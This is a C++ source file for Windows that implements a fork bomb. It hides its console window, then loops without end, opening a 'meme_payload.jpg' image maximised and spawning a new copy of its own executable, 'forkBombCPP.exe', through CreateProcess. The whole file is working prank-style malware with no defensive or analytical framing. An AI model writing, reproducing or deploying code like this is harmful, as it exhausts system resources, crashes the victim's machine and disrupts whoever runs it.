#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unistd.h>
// #include "base64.h"
// #include "hard_coded_image.h" not ready yet

bool check_image_exists(){
    const char* name = "meme_payload.jpg";
    return ( access ( name, F_OK ) != -1);
}

// Opens if there is already a hard-coded image
// Creates if it doesn't exist
// Returns if image was successful
bool open_image(){

    if(check_image_exists()){
        ShellExecute(0, "open", "meme_payload.jpg", NULL, NULL, SW_SHOWMAXIMIZED);
        return 1;
    } else {
        printf("No Payload!");
        return 0;
    }

    // I want to hard-code the base64 of the image into the executable so that it will create the image if it doesn't exist
    // The file will be created once

    // base64_decode(
    //     hard_coded_base64_image(),
    //     false                      // Remove line breaks
    // );

}

int main( )
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );    

    while (1) {
        open_image();
	   // Start the child process. 
	   if (!CreateProcess(NULL,   // No module name (use command line)
		  ((LPSTR) "forkBombCPP.exe"),        // file to run
		  NULL,           // Process handle not inheritable
		  NULL,           // Thread handle not inheritable
		  FALSE,          // Set handle inheritance to FALSE
		  0,              // No creation flags
		  NULL,           // Use parent's environment block
		  NULL,           // Use parent's starting directory 
		  &si,            // Pointer to STARTUPINFO structure
		  &pi)           // Pointer to PROCESS_INFORMATION structure
		  )
	   {
		  printf("CreateProcess failed (%d).\n", GetLastError());
		  return 0;
	   }
    }
    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}
